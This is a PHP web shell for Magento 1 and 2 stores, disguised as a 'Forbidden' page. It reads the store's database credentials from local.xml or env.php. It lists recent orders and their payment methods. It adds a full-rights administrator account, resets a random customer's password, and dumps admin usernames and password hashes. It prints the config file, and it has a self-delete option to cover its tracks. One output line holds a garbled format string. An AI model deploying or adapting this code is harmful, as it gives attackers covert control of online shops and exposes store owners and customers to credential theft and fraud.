<?php
$conn = false;
$connd = array('h'=>'', 'u'=>'', 'p'=>'', 'd'=>'', 'r'=>'');
$isM2 = false;

$path = get_magento_path();


$isMysqli = function_exists('mysqli_connect');
$connResult = '';
if(isset($_POST['btn_c'])) {
    $connd['h'] = @$_POST['h'];
    $connd['u'] = @$_POST['u'];
    $connd['p'] = @$_POST['p'];
    $connd['d'] = @$_POST['d'];
    $connd['r'] = @$_POST['r'];
    $conn = sql_conn($connd);
    if($conn!==false) {
        setcookie('h_c' , $connd['h'].'|'.$connd['u'].'|'.$connd['p'].'|'.$connd['d'].'|'.$connd['r']);
        $connResult = 'Connect ok!<br>';
    } else {
        $connResult = 'Test connection error! ERR:'.sql_conn_error().'<br>';
    }
} elseif(isset($_COOKIE['h_c'])) {
    list($connd['h'], $connd['u'], $connd['p'], $connd['d'], $connd['r']) = explode('|', $_COOKIE['h_c']);
    $conn = sql_conn($connd);
} else {
    $c = load_xml();
    if($c!==false) {
        $connd = $c;
        $conn = sql_conn($connd);
    }
}

?>
<html>
<head>
<title>Forbidden</title>
</head>
<body>
<?php if($conn) { ?>
<p style="display:inline; color:green;">Connected</p> to <?php echo $connd['u'].':'.$connd['p'].'@'.$connd['h'].'/'.$connd['d'].($connd['r']!='' ? ' ('.$connd['r'].')':'').' via '.($isMysqli ? 'MySQLi':'MySQL').' ('.($isM2 ? 'M2' : 'M1').')'; ?>
<?php } else { ?>
<p style="display:inline; color:red;">Not connected</p>
<?php } ?>
<hr>
[<a href="?a=c">Connection</a>] [<a href="?a=o">Orders</a>] [<a href="?a=a">Add admin</a>] [<a href="?a=l">Admin list</a>] [<a href="?a=u">Change user</a>] [<a href="?a=x">local.xml</a>] [<a href="?a=p">Dump</a>] [<a href="?a=d">Delete</a>]<br>
<hr>
<?php 

if(!$conn)
    $act = 'c';
else
    $act = @$_GET['a'];
    
switch($act) {
    case 'c':
        show_c();
    break;
    case 'a':
        show_a();
    break;
    case 'u':
        show_u();
    break;
    case 'o':
        show_o();
    break;
    case 'l':
        show_l();
    break;
    case 'x':
        show_x();
    break;
    case 'p':
        show_p();
    break;
    case 'd':
        $unlink = unlink(__FILE__);
        clearstatcache();
        $exists = file_exists(__FILE__);
        echo "Unlink: <b style='color: ".($unlink===true ? 'green' : 'red')."'>".var_export($unlink, true)."</b><br>\n";
        echo "File exists: <b style='color: ".($exists===false ? 'green' : 'red')."'>".var_export($exists, true)."</b>\n";
    break;
}

?>

</body>
</html>
<?php
function show_o() {
    global $connd, $isM2;
    if(isset($_REQUEST['limit'])) {
        $limit = intval($_REQUEST['limit']);
    } else {
        $limit = 100;
    }

    if($isM2) {

        $q = sql_query("SELECT count(*) as total FROM `{$connd['r']}sales_order` WHERE created_at > DATE_SUB(now(), INTERVAL 1 DAY) ");
        $t1 = sql_array($q);
        $q = sql_query("SELECT count(*) as total FROM `{$connd['r']}sales_order` WHERE created_at > DATE_SUB(now(), INTERVAL 7 DAY) ");
        $t7 = sql_array($q);
        $q = sql_query("SELECT count(*) as total FROM `{$connd['r']}sales_order` WHERE created_at > DATE_SUB(now(), INTERVAL 30 DAY) ");
        $t30 = sql_array($q);
    } else {
        $q = sql_query("SELECT count(*) as total FROM `{$connd['r']}sales_flat_order` WHERE created_at > DATE_SUB(now(), INTERVAL 1 DAY) ");
        $t1 = sql_array($q);
        $q = sql_query("SELECT count(*) as total FROM `{$connd['r']}sales_flat_order` WHERE created_at > DATE_SUB(now(), INTERVAL 7 DAY) ");
        $t7 = sql_array($q);
        $q = sql_query("SELECT count(*) as total FROM `{$connd['r']}sales_flat_order` WHERE created_at > DATE_SUB(now(), INTERVAL 30 DAY) ");
        $t30 = sql_array($q);
    }

    printf('<b>?003f?003f003f003c/b>: %d <b>?003f?003f003f</b>: %d <b>?003f?003f003f003c/b>: %d | <b>?003f?003f003f</b>: %d (?limit=%d)<br>', $t1['total'], $t7['total'], $t30['total'], $limit, $limit);
    if($isM2) {
        $q = sql_query("SELECT * FROM `{$connd['r']}sales_order` ORDER BY `created_at` DESC LIMIT ".$limit);
    } else {
        $q = sql_query("SELECT * FROM `{$connd['r']}sales_flat_order` ORDER BY `created_at` DESC LIMIT ".$limit);
    }
    echo '<table border=1><tr><th>ID</th><th>Date</th><th>Amount</th><th>Pay</th></tr>';
    while($o = sql_array($q)) {
        if($isM2) {
            $qq = sql_query("SELECT `method` FROM `{$connd['r']}sales_order_payment` WHERE `entity_id` = {$o['entity_id']} LIMIT 1");

        } else {
            $qq = sql_query("SELECT `method` FROM `{$connd['r']}sales_flat_order_payment` WHERE `entity_id` = {$o['entity_id']} LIMIT 1");
        }
            $p = sql_array($qq);
            
            $qqq = sql_query( "SELECT `value` FROM `{$connd['r']}core_config_data` WHERE `path` = 'payment/{$p['method']}/title' AND `value` != '' LIMIT 1");
            $pt = sql_array($qqq);
        echo "<tr><td>#{$o['increment_id']}</td><td>{$o['created_at']}</td><td>{$o['base_subtotal_incl_tax']}</td><td>{$p['method']}({$pt['value']})</td></tr>";
    
    }
    echo '</table>';
}
function show_u() {
    global $connd,$isM2;
    if(isset($_POST['btn_uc'])) {
        $p = @$_POST['p'];
        $salt = 'ab';
        
        $q = sql_query("SELECT `entity_id`,`email` FROM `{$connd['r']}customer_entity` ORDER BY RAND() LIMIT 1");
        $u = sql_array($q);
        if(!is_array($u) || $u['entity_id']=='') {
            echo 'Customer search error: '.sql_error().'<br>';
        } else {
            if($isM2) {
                sql_query("UPDATE `{$connd['r']}customer_entity` SET password_hash = '".md5($salt.$p).":{$salt}:0' WHERE entity_id = {$u['entity_id']}");
            }
            if(sql_query("INSERT INTO `{$connd['r']}customer_entity_varchar` (value_id, attribute_id, entity_id, value) VALUES(null, (select attribute_id from `{$connd['r']}eav_attribute` where attribute_code='password_hash' and entity_type_id=1 LIMIT 1), {$u['entity_id']}, '".md5($salt.$p).":{$salt}') ON DUPLICATE KEY UPDATE value='".md5($salt.$p).":{$salt}'")) {
                echo 'Update ok!<br>';
                echo 'ID: '.$u['entity_id'].'<br>';
                echo 'Email: '.$u['email'].'<br>';
                echo 'Pass: '.$p.'<br>';
            } else {
                echo 'Customer update error: '.sql_error().'<br>';
            }           
        }
    }
    echo '<form method="POST">
    Pass: <input type="text" name="p"><br>
    <input type="submit" name="btn_uc" value="Change password">
    </form>';
}
function show_a() {
    global $connd,$isM2;
    if(isset($_POST['btn_aa'])) {
        $salt = 'ab';
        if($isM2) {
            $q1 = "INSERT INTO `{$connd['r']}admin_user` (`firstname`,`lastname`,`email`,`username`,`password`) VALUES ('".sql_escape(@$_POST['f'])."','".sql_escape(@$_POST['l'])."','".sql_escape(@$_POST['e'])."','".sql_escape(@$_POST['u'])."','".hash('sha256', $salt.@$_POST['p']).":{$salt}:1')";
        } else {
            $q1 = "INSERT INTO `{$connd['r']}admin_user` (`firstname`,`lastname`,`email`,`username`,`password`) VALUES ('".sql_escape(@$_POST['f'])."','".sql_escape(@$_POST['l'])."','".sql_escape(@$_POST['e'])."','".sql_escape(@$_POST['u'])."','".md5($salt.@$_POST['p']).":{$salt}')";
        }
        if(sql_query($q1)) {
                if($isM2) {
                    $q2 = "INSERT INTO `{$connd['r']}authorization_role` (`role_id`,`parent_id`,`tree_level`,`sort_order`,`role_type`,`user_id`,`role_name`,`user_type`) VALUES (null, 1, 2, 0, 'U', ".sql_id().", '".sql_escape(@$_POST['u'])."', 2)";
                } else {
                    $q2 = "INSERT INTO `{$connd['r']}admin_role` (`role_id`,`parent_id`,`tree_level`,`sort_order`,`role_type`,`user_id`,`role_name`) VALUES (null, 1, 2, 0, 'U', ".sql_id().", '".sql_escape(@$_POST['u'])."')";
                }
                if(sql_query($q2)) 
                    echo "Added admin!<br>";
                else
                    echo "Error when adding admin role: ".sql_error()."<br>";
        
            
        } else
            echo "Error when adding admin: ".sql_error()."<br>";
    }
    
    echo '<form method="POST">
    First:<input type="text" name="f"><br>
    Last:<input type="text" name="l"><br>
    Email:<input type="text" name="e"><br>
    Login:<input type="text" name="u"><br>
    Pass:<input type="text" name="p"><br>
    <input type="submit" name="btn_aa" value="Add">
    </form>';
}
function show_c() {
    global $connd, $connResult;
    if(isset($_POST['btn_l'])) {
        $c = load_xml();
        if($c===false)
            echo 'Cannot find xml!<br>';
        else
            $connd = $c;
    }
    if($connResult!='') {
        echo $connResult;
    }
    echo '<form method="POST">
    Host: <input type="text" name="h" value="'.$connd['h'].'"><br>
    User: <input type="text" name="u" value="'.$connd['u'].'"><br>
    Pass: <input type="text" name="p" value="'.$connd['p'].'"><br>
    DB: <input type="text" name="d" value="'.$connd['d'].'"><br>
    Prefix: <input type="text" name="r" value="'.$connd['r'].'"><br>
    <input type="submit" name="btn_c" value="Save"><input type="submit" name="btn_l" value="Load xml">
    </form>';
}
function show_l() {
    global $connd;

    $q = sql_query("SELECT * FROM `{$connd['r']}admin_user` ORDER BY `user_id` ASC");

    echo '<table border=1><tr><th>ID</th><th>Name</th><th>Login</th><th>Email</th><th>Password</th><th>Log date</th></tr>';
    $outStr = '';
    $dumpStr = 'user_id/firstname/lastname/username/email/password/logdate/is_active'."\n";
    while($item = sql_array($q)) {
        $outStr .= $item['username'].':'.$item['password']."\r\n";
        $dumpStr .= $item['user_id'].'/'.$item['firstname'].'/'.$item['lastname'].'/'.$item['username'].'/'.$item['email'].'/'.$item['password'].'/'.$item['logdate'].'/'.$item['is_active']."\n";
        echo '<tr><td>'.$item['user_id'].'</td><td>'.$item['firstname'].' '.$item['lastname'].'</td><td>'.$item['username'].'</td><td>'.$item['email'].'</td><td>'.$item['password'].'</td><td>'.$item['logdate'].' ('.$item['is_active'].')</td></tr>';
    }
    echo '</table>';
    echo '<textarea cols=100 rows=20>'.htmlspecialchars($outStr).'</textarea><br>';
    echo '<textarea cols=100 rows=20>'.htmlspecialchars($dumpStr).'</textarea>';
}
function show_x() {
    global $isM2;
    $xml = get_xml();
    if($isM2) {
        echo "Path: <b>".get_magento_path()."/app/etc/env.php</b><br>";
        echo '<textarea cols=100 rows=20>'.htmlspecialchars(file_get_contents(get_magento_path()."/app/etc/env.php")).'</textarea>';
    } else {
        echo "Path: <b>".get_magento_path()."/app/etc/local.xml</b><br>";
        echo '<textarea cols=100 rows=20>'.htmlspecialchars($xml).'</textarea>';
    }
}

function show_p() {
    global $connd;
    global $isM2;

    if($isM2)
        $q = sql_query("SELECT count(*) as total FROM `{$connd['r']}sales_order` WHERE created_at > DATE_SUB(now(), INTERVAL 30 DAY) ");
    else
        $q = sql_query("SELECT count(*) as total FROM `{$connd['r']}sales_flat_order` WHERE created_at > DATE_SUB(now(), INTERVAL 30 DAY) ");

    $t30 = sql_array($q);

    $xml = '';
    if($isM2) {
        $xml .= "<h_engine_name>[PHP] Magento 2.x</h_engine_name>\n";
    } else {
        $xml .= "<h_engine_name>[PHP] Magento 1.x</h_engine_name>\n";
    }

    $xml .= "<h_engine_path>".get_magento_path()."</h_engine_path>\n";
    $xml .= "<h_ordes_count_m>".$t30['total']."</h_ordes_count_m>\n";
    $xml .= "<h_admins_list>".getAdminsRaw()."</h_admins_list>\n";
    
    if($isM2) {
        $xml .= "<h_config_local_xml>".file_get_contents(get_magento_path()."/app/etc/env.php")."</h_config_local_xml>";
    } else {
        $xml .= "<h_config_local_xml>".get_xml()."</h_config_local_xml>";
    }

    echo '<textarea cols=100 rows=20>'.htmlspecialchars($xml).'</textarea>';
}




function load_xml() {
    global $isM2;
    $xml = get_xml();

    if($xml!==false) {
            if($isM2) {
                return array('h'=>$xml['db']['connection']['default']['host'], 'u'=>$xml['db']['connection']['default']['username'], 'p'=>$xml['db']['connection']['default']['password'],'d'=>$xml['db']['connection']['default']['dbname'],'r'=>$xml['db']['connection']['table_prefix']);    
            } else {
                $xml = preg_replace('/<!--(.*?)-->/is', '', $xml);
                preg_match('/<host><!\[CDATA\[(.*?)\]\]><\/host>/i', $xml, $m1);
                preg_match('/<username><!\[CDATA\[(.*?)\]\]><\/username>/i', $xml, $m2);
                preg_match('/<password><!\[CDATA\[(.*?)\]\]><\/password>/i', $xml, $m3);
                preg_match('/<dbname><!\[CDATA\[(.*?)\]\]><\/dbname>/i', $xml, $m4);
                preg_match('/<table_prefix><!\[CDATA\[(.*?)\]\]><\/table_prefix>/i', $xml, $m5);
                
                return array('h'=>$m1[1], 'u'=>$m2[1], 'p'=>$m3[1],'d'=>$m4[1],'r'=>$m5[1]);
            }

    }
    
    return false;
}

function getAdminsRaw() {
    global $connd;
    $q = sql_query("SELECT * FROM `{$connd['r']}admin_user` ORDER BY `user_id` ASC");

    $dumpStr = 'user_id/firstname/lastname/username/email/password/logdate/is_active'."\n";
    while($item = sql_array($q)) {
        $dumpStr .= $item['user_id'].'/'.$item['firstname'].'/'.$item['lastname'].'/'.$item['username'].'/'.$item['email'].'/'.$item['password'].'/'.$item['logdate'].'/'.$item['is_active']."\n";
    }

    return $dumpStr;
}

function get_xml() {
    global $isM2;
    if($isM2) {
        return include(get_magento_path().'/app/etc/env.php');
    } else {
        return file_get_contents(get_magento_path().'/app/etc/local.xml');
    }
    
}

function get_magento_path() {
    global $isM2;
    for($i=0;$i<=10;$i++) {
        if(file_exists(str_repeat('../', $i).'app/etc/local.xml')) {
            $isM2 = false;
            return realpath(str_repeat('../', $i));
        }
        if(file_exists(str_repeat('../', $i).'app/etc/env.php')) {
            $isM2 = true;
            return realpath(str_repeat('../', $i));
        }

    }

    return false;
}

function sql_conn($data) {
    global $isMysqli;
    if($isMysqli) {
        $c = mysqli_connect($data['h'], $data['u'], $data['p'], $data['d']);
        if($c===false)
            return false;
        if(!mysqli_set_charset($c, 'utf8'))
            return false;

    } else {
        $c = mysql_connect($data['h'], $data['u'], $data['p']);
        if(!$c)
            return false;
        if(!mysql_select_db($data['d']))
            return false;
        if(!mysql_set_charset('utf8'))
            return false;
        
    }

    return $c;
}

function sql_query($q) {
    global $conn, $isMysqli;
    if($isMysqli) {
        return mysqli_query($conn, $q);
    } else {
        return mysql_query($q, $conn);
    }
}

function sql_array($q) {
    global $conn, $isMysqli;
    return $isMysqli ? mysqli_fetch_array($q) : mysql_fetch_array($q);
}

function sql_error() {
    global $isMysqli, $conn;
    return $isMysqli ? mysqli_error($conn) : mysql_error();
}

function sql_escape($str) {
    global $isMysqli, $conn;
    return $isMysqli ? mysqli_real_escape_string($conn, $str) : mysql_real_escape_string($str);
}

function sql_id() {
    global $isMysqli, $conn;
    return $isMysqli ? mysqli_insert_id($conn) : mysql_insert_id();
}

function sql_conn_error() {
    global $isMysqli;
    return $isMysqli ? mysqli_connect_error() : mysql_error();
}